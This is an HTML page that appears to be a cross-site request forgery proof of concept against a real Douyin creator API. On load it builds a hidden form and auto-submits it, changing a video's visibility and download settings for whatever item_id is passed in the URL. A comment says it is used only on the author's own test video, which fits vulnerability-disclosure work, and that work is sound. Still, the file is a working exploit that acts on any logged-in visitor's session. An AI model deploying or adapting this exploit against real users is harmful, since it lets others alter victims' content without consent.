<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CSRF PoC - parameterized flip (own video, reversible)</title></head>
<body>
<h3>CSRF flip PoC</h3>
<pre id="out">running...</pre>
<script>
// Reads ?item_id= and ?v= from query. Used ONLY on attacker-owned test video, values reverted after test.
const q = new URLSearchParams(location.search);
const itemId = q.get("item_id");
const vis = q.get("v") || "2";
const dl = q.get("dl") || "1";
document.getElementById("out").textContent = `item_id=${itemId} visibility=${vis}`;
if (itemId) {
  const form = document.createElement("form");
  form.method = "POST";
  form.action = "https://creator.douyin.com/web/api/media/aweme/update/?aid=1128";
  form.enctype = "application/x-www-form-urlencoded";
  const fields = { item_id: itemId, download: dl, visibility_type: vis, xg_user_id: "0", dx_upgraded: "0" };
  for (const [k, v] of Object.entries(fields)) {
    const inp = document.createElement("input");
    inp.type = "hidden"; inp.name = k; inp.value = v;
    form.appendChild(inp);
  }
  document.body.appendChild(form);
  form.submit();
}
</script>
</body>
</html>
